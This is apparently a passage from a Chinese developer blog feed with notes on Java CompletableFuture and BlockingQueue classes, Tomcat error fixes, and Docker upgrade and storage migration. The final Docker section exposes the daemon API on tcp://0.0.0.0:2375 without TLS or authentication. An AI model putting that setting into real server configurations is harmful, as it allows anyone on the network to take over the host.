            <span class="token keyword">return</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" HELLO"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">boolean</span> status <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">completeExceptionally</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"等不及返回结果"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> status<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 抛出异常</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 不会执行</span>
        <span class="token comment">//result.thenAccept((e) -&gt; {</span>
        <span class="token comment">//    System.out.println("-------------");</span>
        <span class="token comment">//});</span>
        <span class="token comment">// 不会执行</span>
        <span class="token comment">//result.thenApply(e -&gt; "-----");</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" main exit."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">int</span> seconds<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>seconds<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">1659412396003</span> <span class="token boolean">true</span>
<span class="token class-name">Exception</span> in thread <span class="token string">"main"</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span>ExecutionException</span><span class="token operator">:</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>RuntimeException</span><span class="token operator">:</span> 等不及返回结果
	at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span>CompletableFuture</span><span class="token punctuation">.</span><span class="token function">reportGet</span><span class="token punctuation">(</span><span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">357</span><span class="token punctuation">)</span>
	at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span>CompletableFuture</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1895</span><span class="token punctuation">)</span>
	at <span class="token class-name"><span class="token namespace">hots<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>executor<span class="token punctuation">.</span>future<span class="token punctuation">.</span></span>CompletableFutureExample6</span><span class="token punctuation">.</span><span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">CompletableFutureExample6</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">22</span><span class="token punctuation">)</span>
<span class="token class-name">Caused</span> by<span class="token operator">:</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>RuntimeException</span><span class="token operator">:</span> 等不及返回结果
	at <span class="token class-name"><span class="token namespace">hots<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>executor<span class="token punctuation">.</span>future<span class="token punctuation">.</span></span>CompletableFutureExample6</span><span class="token punctuation">.</span><span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">CompletableFutureExample6</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">19</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>并发集合</h1>
<p>JDK中并发队列提供了两种实现,一种是高性能队列ConcurrentLinkedQueue,一种是阻塞队列BlockingQueue,两种都继承自Queue:</p>
<h2 id="BlockingQueue集合类关系图">BlockingQueue集合类关系图</h2>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/BlockingDeque-1667231117133-94.png" alt="BlockingDeque"></p>
<h2 id="BlockingQueue的7个子类">BlockingQueue的7个子类</h2>
<ul>
<li>Queue 方法概述</li>
</ul>
<table>
<thead>
<tr>
<th></th>
<th>Throws exception</th>
<th>Returns special value</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Insert</td>
<td>add(e)</td>
<td>offer(e)：【@return：true if the element was added to this queue, else false】</td>
<td></td>
</tr>
<tr>
<td>Remove</td>
<td>remove()</td>
<td>poll()：【@return：the head of this queue, or null if the specified waiting time elapses before an element is available】</td>
<td></td>
</tr>
<tr>
<td>Examine</td>
<td>element()</td>
<td>peek()：【@return：the head of this queue, or null if this queue is empty】</td>
<td></td>
</tr>
</tbody>
</table>
<ul>
<li>BlockingQueue 方法概述</li>
</ul>
<table>
<thead>
<tr>
<th></th>
<th>Throws exception</th>
<th>Returns special value</th>
<th>Blocks</th>
<th>Times out</th>
</tr>
</thead>
<tbody>
<tr>
<td>Insert</td>
<td>add(e)</td>
<td>offer(e)</td>
<td>put(e)</td>
<td>offer(e, time, unit)</td>
</tr>
<tr>
<td>Remove</td>
<td>remove()</td>
<td>poll()</td>
<td>take()</td>
<td>poll(time, unit)</td>
</tr>
<tr>
<td>Examine</td>
<td>element()</td>
<td>peek()</td>
<td>—</td>
<td>—</td>
</tr>
</tbody>
</table>
<ul>
<li>说明</li>
</ul>
<ol>
<li>
<p>ArrayBlockingQueue</p>
<p>​		 <strong>基于数组的阻塞队列实现</strong>，在ArrayBlockingQueue内部，维护了一个定长数组，以便缓存队列中的数据对象，这是一个常用的阻塞队列，除了一个定长数组外，ArrayBlockingQueue内部还保存着两个整形变量，分别标识着队列的头部和尾部在数组中的位置。<strong>ArrayBlockingQueue在生产者放入数据和消费者获取数据，都是共用同一个锁对象</strong>，<strong>由此也意味着两者无法真正并行运行，这点尤其不同于LinkedBlockingQueue；</strong> 按照实现原理来分析，ArrayBlockingQueue完全可以采用分离锁，从而实现生产者和消费者操作的完全并行运行。Doug Lea之所以没这样去做，也许是因为ArrayBlockingQueue的数据写入和获取操作已经足够轻巧，以至于引入独立的锁机制，除了给代码带来额外的复杂性外，其在性能上完全占不到任何便宜。  <strong>ArrayBlockingQueue和LinkedBlockingQueue间还有一个明显的不同之处在于，前者在插入或删除元素时不会产生或销毁任何额外的对象实例，而后者则会生成一个额外的Node对象。这在长时间内需要高效并发地处理大批量数据的系统中，其对于GC的影响还是存在一定的区别。而在创建ArrayBlockingQueue时，我们还可以控制对象的内部锁是否采用公平锁，默认采用非公平锁。</strong></p>
</li>
<li>
<p>LinkedBlockingQueue</p>
<ul>
<li><strong>基于链表的阻塞队列</strong>，同ArrayBlockingQueue类似，其内部也维持着一个数据缓冲队列（该队列由一个链表构成）。当生产者往队列中放入一个数据时，队列会从生产者手中获取数据，并缓存在队列内部，而生产者立即返回；只有当队列缓冲区达到最大值缓存容量时（LinkedBlockingQueue可以通过构造函数指定该值），才会阻塞生产者队列，直到消费者从队列中消费掉一份数据，生产者线程会被唤醒，反之对于消费者这端的处理也基于同样的原理。而LinkedBlockingQueue之所以能够高效的处理并发数据，<strong>还因为其对于生产者端和消费者端分别采用了独立的锁来控制数据同步，这也意味着在高并发的情况下生产者和消费者可以并行地操作队列中的数据，以此来提高整个队列的并发性能。</strong></li>
<li><strong>作为开发者，我们需要注意的是，如果构造一个LinkedBlockingQueue对象，而没有指定其容量大小，LinkedBlockingQueue会默认一个类似无限大小的容量（Integer.MAX_VALUE），这样的话，如果生产者的速度一旦大于消费者的速度，也许还没有等到队列满阻塞产生，系统内存就有可能已被消耗殆尽了</strong></li>
<li>ArrayBlockingQueue和LinkedBlockingQueue是两个最普通也是最常用的阻塞队列，一般情况下，在处理多线程间的生产者消费者问题，使用这两个类足以</li>
</ul>
</li>
<li>
<p>PriorityBlockingQueue</p>
<p>​		基于优先级的阻塞队列（优先级的判断通过构造函数传入的Compator对象来决定），但需要注意的是PriorityBlockingQueue并不会阻塞数据生产者，而只会在没有可消费的数据时，阻塞数据的消费者。因此使用的时候要特别注意，生产者生产数据的速度绝对不能快于消费者消费数据的速度，否则时间一长，会最终耗尽所有的可用堆内存空间。在实现PriorityBlockingQueue时，<strong>内部控制线程同步的锁采用的是公平锁</strong></p>
</li>
<li>
<p>DelayQueue</p>
<p>​		DelayQueue中的元素只有当其指定的延迟时间到了，才能够从队列中获取到该元素。DelayQueue是一个没有大小限制的队列，因此往队列中插入数据的操作（生产者）永远不会被阻塞，而只有获取数据的操作（消费者）才会被阻塞。</p>
<p>​		DelayQueue使用场景较少，但都相当巧妙，常见的例子比如使用一个DelayQueue来管理一个超时未响应的连接队列。</p>
</li>
<li>
<p>SynchronousQueue</p>
<p>​		一种无缓冲的等待队列，生产者产生的数据直接会被消费者获取并消费， 类似于无中介的直接交易，有点像原始社会中的生产者和消费者，生产者拿着产品去集市销售给产品的最终消费者，而消费者必须亲自去集市找到所要商品的直接生产者，如果一方没有找到合适的目标，那么对不起，大家都在集市等待。相对于有缓冲的BlockingQueue来说，少了一个中间经销商的环节（缓冲区），如果有经销商，生产者直接把产品批发给经销商，而无需在意经销商最终会将这些产品卖给那些消费者，由于经销商可以库存一部分商品，因此相对于直接交易模式，总体来说采用中间经销商的模式会吞吐量高一些（可以批量买卖）；但另一方面，又因为经销商的引入，使得产品从生产者到消费者中间增加了额外的交易环节，单个产品的及时响应性能可能会降低。</p>
<p>​		声明一个SynchronousQueue有两种不同的方式，它们之间有着不太一样的行为。</p>
<p>公平模式和非公平模式的区别:</p>
<ul>
<li>
<p>如果采用公平模式：SynchronousQueue会采用公平锁，并<strong>配合一个FIFO队列</strong>来阻塞多余的生产者和消费者，从而体系整体的公平策略；</p>
</li>
<li>
<p>但如果是非公平模式（SynchronousQueue默认）：SynchronousQueue采用非公平锁，同时<strong>配合一个LIFO队列</strong>来管理多余的生产者和消费者，而后一种模式，如果生产者和消费者的处理速度有差距，则很容易出现饥渴的情况，即可能有某些生产者或者是消费者的数据永远都得不到处理。</p>
</li>
</ul>
</li>
<li>
<p>LinkedTransferQueue</p>
<p>传入的数据，需要担保被使用了。否则放入失败/阻塞</p>
<pre class="line-numbers language-none"><code class="language-none">private static final int NOW   = 0; // for untimed poll, tryTransfer
private static final int ASYNC = 1; // for offer, put, add
private static final int SYNC  = 2; // for transfer, take
private static final int TIMED = 3; // for timed poll, tryTransfer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<table>
<thead>
<tr>
<th></th>
<th>ArrayBlockingQueue</th>
<th>PriorityBlockingQueue</th>
<th>LinkedBlockingQueue</th>
<th>LinkedBlockingDeque</th>
<th>SynchronousQueue</th>
<th>DelayQueue</th>
<th>LinkedTransferQueue</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>bounded（边界）</strong></td>
<td>Y</td>
<td>N</td>
<td>Optional</td>
<td>Optional</td>
<td>Y</td>
<td>N</td>
<td>N</td>
</tr>
<tr>
<td><strong>add</strong></td>
<td>添加成功：返回<code>true</code>；<br>添加失败（已满）：抛出<code>IllegalStateException</code><br></td>
<td>调用<code>offer</code>，返回结果同offer</td>
<td>调用<code>offer</code><br>添加成功：返回<code>true</code>；<br>添加失败（false）：抛出<code>IllegalStateException</code><br></td>
<td><font color="orange"><strong>由<code>addLast</code>执行</strong></font><br><br>调用<code>offerLast</code><br>添加成功：返回<code>true</code>；<br>添加失败（false）：抛出<code>IllegalStateException</code><br></td>
<td>调用<code>offer</code><br>添加成功：返回<code>true</code>；<br>添加失败（已满）：抛出<code>IllegalStateException</code><br></td>
<td>同<code>offer</code></td>
<td>在尾部插入元素<br>无边界Queue，不会抛出IllegalStateException，或者false。<br>添加成功：返回<code>true</code>；<br></td>
</tr>
<tr>
<td><font color="red"><strong>offer</strong></font></td>
<td>添加成功：返回<code>true</code>；<br>添加失败(已满)：返回<code>false</code><br></td>
<td>添加成功，返回<code>true</code>；<br>无边界，不存在已满<br>抛出异常：元素无法compare<br></td>
<td>队尾添加成功：返回<code>true</code>；<br>添加失败(已满)：返回<code>false</code><br></td>
<td><font color="orange"><strong>同<code>offerLast</code></strong></font><br><br>队尾添加成功：返回<code>true</code>；<br>添加失败(已满)：返回<code>false</code><br></td>
<td>如果另一个线程正在等待接收，则将指定元素插入此队列，返回<code>true</code>;<br>没有接收线程，返回<code>false</code></td>
<td>在尾部插入元素<br>添加成功，返回<code>true</code>；<br>无边界Queue，不存在已满<br></td>
<td>同 <code>add</code></td>
</tr>
<tr>
<td><font color="blue"><strong>put（阻塞）</strong></font></td>
<td>将指定元素插入此队列的==尾部==，如果队列已满，则==等待空间可用==</td>
<td>同<code>offer</code>。无边界，无需阻塞。</td>
<td>在此队列的尾部插入指定元素，如有必要，则==等待空间可用==。</td>
<td><font color="orange"><strong>同<code>putLast</code></strong></font><br><br>在此队列的尾部插入指定元素，如有必要，则==等待空间可用==。</td>
<td>将指定元素添加到此队列中，阻塞，等待另一个线程接收它。</td>
<td>同<code>offer</code></td>
<td>同<code>add</code></td>
</tr>
<tr>
<td><strong>remove</strong></td>
<td><code>poll</code>头部元素，如果为null，则会抛出异常</td>
<td><code>poll</code>头部元素，如果为null，则会抛出异常</td>
<td><code>poll</code>头部元素，如果为null，则会抛出异常</td>
<td><font color="orange"> <strong>同<code>removeFirst</code></strong> </font> <br><br><code>pollFirst</code>头部元素，如果为null，则会抛出异常</td>
<td><code>poll</code>头部元素，如果为null，则会抛出异常</td>
<td><code>poll</code>头部元素，如果为null，则会抛出异常</td>
<td><code>poll</code>头部元素，如果为null，则会抛出异常</td>
</tr>
<tr>
<td><font color="red"><strong>poll</strong></font></td>
<td>移除头部元素并返回<br>无元素返回<code>null</code></td>
<td>移除头部元素并返回<br>无元素返回<code>null</code></td>
<td>移除头部元素并返回<br>无元素返回<code>null</code></td>
<td><font color="orange"> <strong>同<code>pollFirst</code></strong> </font> <br><br>移除头部元素并返回<br>无元素返回<code>null</code></td>
<td>移除头部元素并返回<br>如果没有可用元素，则返回 <code>null</code><br>无元素返回<code>null</code></td>
<td>移除头部元素并返回<br>如果此队列没有具有过期延迟的元素，则返回<code>null</code><br>无元素返回<code>null</code></td>
<td>移除头部元素并返回<br>无元素返回<code>null</code></td>
</tr>
<tr>
<td><strong>element</strong></td>
<td><code>peek </code>头部元素<br>若结果为null，则抛出异常<code>NoSuchElementException</code></td>
<td><code>peek </code>头部元素<br>若结果为null，则抛出异常<code>NoSuchElementException</code></td>
<td><code>peek </code>头部元素<br>若结果为null，则抛出异常<code>NoSuchElementException</code></td>
<td>**<code>peekFirst</code>**头部元素<br><br>若结果为null，则抛出异常<code>NoSuchElementException</code></td>
<td><code>peek </code>头部元素<br>永远抛出<code>NoSuchElementException</code></td>
<td><code>peek </code>头部元素<br>若结果为null，则抛出异常<code>NoSuchElementException</code></td>
<td><code>peek </code>头部元素<br>若结果为null，则抛出异常<code>NoSuchElementException</code></td>
</tr>
<tr>
<td><strong>peek</strong></td>
<td>获取头部元素<br>不会删除元素</td>
<td>获取头部元素<br>不会删除元素</td>
<td>获取头部元素<br>不会删除元素</td>
<td>**<code>peekFirst</code>**头部元素<br><br>获取头部元素<br>不会删除元素</td>
<td>直接 <code>return null</code></td>
<td>获取头部元素<br>不会删除元素</td>
<td>获取头部元素<br>不会删除元素</td>
</tr>
<tr>
<td><font color="blue"><strong>take（阻塞）</strong></font></td>
<td>移除头部元素并返回<br>队列无元素，则阻塞等待<br></td>
<td>移除头部元素并返回<br>队列无元素，则阻塞等待<br></td>
<td>移除头部元素并返回<br>队列无元素，则阻塞等待<br></td>
<td>同**<code>takeFirst</code>**<br><br>移除头部元素并返回<br>队列无元素，则阻塞等待<br></td>
<td>一直等待，直到有另一个线程<code>transfer</code>元素</td>
<td>一直等待，直到有线程放进元素，且头部元素过期</td>
<td>一直等待，直到有线程放进元素</td>
</tr>
<tr>
<td><strong>transfer</strong></td>
<td>无</td>
<td>无</td>
<td>无</td>
<td>无</td>
<td>无</td>
<td>无</td>
<td>在队列尾部插入元素，若没有被消费，则一直等待</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p>ConcurrentHashMap</p>
</li>
<li>
<p>ConcurrentSkipListMap</p>
</li>
<li>
<p>ConcurrentSkipListSet</p>
</li>
<li>
<p>ConcurrentLinkedQueue</p>
</li>
<li>
<p>ConcurrentLinkedDeque</p>
</li>
<li>
<p>CopyOnWriteArrayList</p>
</li>
<li>
<p>CopyOnWriteArraySet</p>
</li>
</ul>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>验证码图片无法显示</title>
    <url>/20221030/294d5c08.html</url>
    <content><![CDATA[<h1>问题描述</h1>
<p>服务器段错误信息：<code>java.lang.NoClassDefFoundError: Could not initialize class sun.awt.X11.XToolkit</code></p>
<h1>定位原因</h1>
<p>对于一个Java服务器来说经常要处理一些图形元素，例如地图的创建或者图形和图表等。</p>
<p>这些API基本上总是需要运行一个<code>X-server</code>以便能使用AWT（Abstract Window Toolkit，抽象窗口工具集）。</p>
<h1>问题处理</h1>
<p>在<code>Tomcat/bin/catalina.sh</code> 中增加 <code>-Djava.awt.headless=true</code><br>
如下：<code>JAVA_OPTS="$JAVA_OPTS -Djava.awt.headless=true"</code></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211214011929661-1678153946602-1.png" alt="image-20211214011929661"></p>
]]></content>
      <categories>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>点滴</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>在请求目标中找到无效字符</title>
    <url>/20221030/d035d83e.html</url>
    <content><![CDATA[<h1>问题描述</h1>
<p>错误信息：在请求目标中找到无效字符。有效字符在rfc 7230和rfc 3986中定义</p>
<h1>定位原因</h1>
<p>原因：请求地址中存在不支持的特殊符号</p>
<h1>解决方法</h1>
<p>解决： <code>relaxedPathChars="|{}[],%" relaxedQueryChars="|{}[],%"</code></p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Connector</span> <span class="token attr-name">port</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>80<span class="token punctuation">"</span></span> <span class="token attr-name">protocol</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTTP/1.1<span class="token punctuation">"</span></span>
           <span class="token attr-name">connectionTimeout</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20000<span class="token punctuation">"</span></span><span class="token attr-name">relaxedPathChars</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>|{}[],%<span class="token punctuation">"</span></span> <span class="token attr-name">relaxedQueryChars</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>|{}[],%<span class="token punctuation">"</span></span>
           <span class="token attr-name">redirectPort</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8443<span class="token punctuation">"</span></span>  <span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>点滴</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>给Tomcat配置外部资源路径</title>
    <url>/20221030/673ec6c6.html</url>
    <content><![CDATA[<h1>背景说明</h1>
<p>对于一个web项目来说，除了文字之外，图片，视频等媒体元素也是其重要的组成部分。</p>
<p>我们知道，web项目中如果用到大量的图片、视屏的资源，我们通常的做法是只在数据库中存储图片、视频等资源的路径，web项目直接通过路径来引用到对应的资源，而不是把整张图片以流的形式存储在数据库中，<br>
​</p>
<p>当然对于系统中没用用到大量图片，或是对图片质量要求不是很高的一些小图标，我们也可以直接采用留的形式或者用base64编码以longtext的形式存储到数据库中。可以不必费时费力去配置这些资源的路径。</p>
<p>但是他的弊端在于增加了数据库的压力，只适用于那种格局比较小，对数据库服务器性能没有太大要求的小项目中。</p>
<p>给Tomcat配置外部资源路径的好处在于他大大减小了服务器以及数据库的压力，数据库中只需要存储资源的路径，把图片上传到Tomcat外的指定文件夹中，提供给<br>
Tomcat中wabapps下的web项目引用。</p>
<h1>处理方法</h1>
<p>找到tomcat安装目录下conf/server.xml文件，在<host>…</host>标签内添加配置：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- video image resources fload--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Context</span> <span class="token attr-name">docBase</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>C:\resources<span class="token punctuation">"</span></span> <span class="token attr-name">reloadable</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token attr-name">debug</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/resources<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ul>
<li>docBase是文件夹的物理路径</li>
<li>path是该文件夹的访问路径</li>
</ul>
<p>然后重启tomcat即可。假设在resources文件夹下存在一张名为test.jpg的图片，此时只需要<code>http://localhost:8080/resources/test.jsp</code>即可访问到该图片资源。</p>
]]></content>
      <categories>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>点滴</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker日常使用记录</title>
    <url>/20221030/868b0954.html</url>
    <content><![CDATA[<h1>Docker 升级到最新版本</h1>
<h2 id="升级步骤">升级步骤</h2>
<h3 id="1、查看系统要求">1、查看系统要求</h3>
<p>Docker 要求 CentOS 系统的内核版本高于 3.10 ,查看CentOS的内核版本。</p>
<pre class="line-numbers language-none"><code class="language-none">uname -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="2、删除旧版本">2、删除旧版本</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum remove <span class="token function">docker</span>  docker-common docker-selinux docker-engine<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="3、安装需要的软件包">3、安装需要的软件包</h3>
<p>yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> <span class="token parameter variable">-y</span> yum-utils device-mapper-persistent-data lvm2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="4、设置Docker-yum源">4、设置Docker yum源</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="5、查看所有仓库中所有docker版本">5、查看所有仓库中所有docker版本</h3>
<p>可以查看所有仓库中所有docker版本,并选择特定的版本安装。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> docker-ce-18.06.1.ce  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="7、启动">7、启动</h3>
<p>设置为开机启动</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>启动</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl start <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>查看启动状态</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl status <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>查看版本</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="升级过程中的问题">升级过程中的问题</h2>
<ol>
<li>容器报错Unknown runtime specified docker-run</li>
</ol>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">[root@nginx discourse]# grep -rl 'docker-runc' /var/lib/docker/containers/ | xargs sed -i 's/docker-runc/runc/g'
[root@wxb-h5-weixin discourse]# systemctl restart docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h1>迁移Docker默认存储目录</h1>
<p>Docker默认路径存储空间不足，迁移Docker默认存储目录</p>
<h2 id="关掉所有正在运行的容器">关掉所有正在运行的容器</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 关闭docker服务</span>
<span class="token function">docker</span> stop <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> <span class="token parameter variable">-q</span> <span class="token parameter variable">-f</span> <span class="token assign-left variable">status</span><span class="token operator">=</span>running<span class="token variable">)</span></span>
systemctl stop <span class="token function">docker</span>

<span class="token comment"># 将Docker现目录挪到一个新目录下，这两个目录依照具体情况而定，我的分别是/var/lib/docker和/home/docker</span>
<span class="token function">mv</span> /var/lib/docker /home/docker

将原来的数据备份一份，备份大法好，万一不行还不至于损坏数据

<span class="token builtin class-name">cd</span> /home
<span class="token function">tar</span> zcf docker_file_bak.tar.gz /home/docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="修改启动文件">修改启动文件</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 修改服务启动命令，服务的service文件为/lib/systemd/system/docker.service，将里面的内容ExecStart=/usr/bin/dockerd修改为如下：</span>

<span class="token assign-left variable">ExecStart</span><span class="token operator">=</span>/usr/bin/dockerd <span class="token parameter variable">-g</span> /home/docker

<span class="token comment"># 重新加载修改后的service文件</span>
systemctl daemon-reload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="重启">重启</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 启动Docker服务</span>
systemctl start <span class="token function">docker</span>

验证修改成功
<span class="token function">docker</span> info <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Docker Root Dir"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1><a href="https://juejin.cn/post/6844903865192562696">IDEA远程一键部署Springboot到Docker</a></h1>
<h2 id="一、开发前准备">一、开发前准备</h2>
<h4 id="1-Docker的安装可以参考https-docs-docker-com-install">1. Docker的安装可以参考https://docs.docker.com/install/</h4>
<h4 id="2-配置docker远程连接端口">2. 配置docker远程连接端口</h4>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vi</span> /usr/lib/systemd/system/docker.service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>找到 <strong>ExecStart</strong>，在最后面添加 <strong>-H tcp://0.0.0.0:2375</strong>，如下图所示</p>
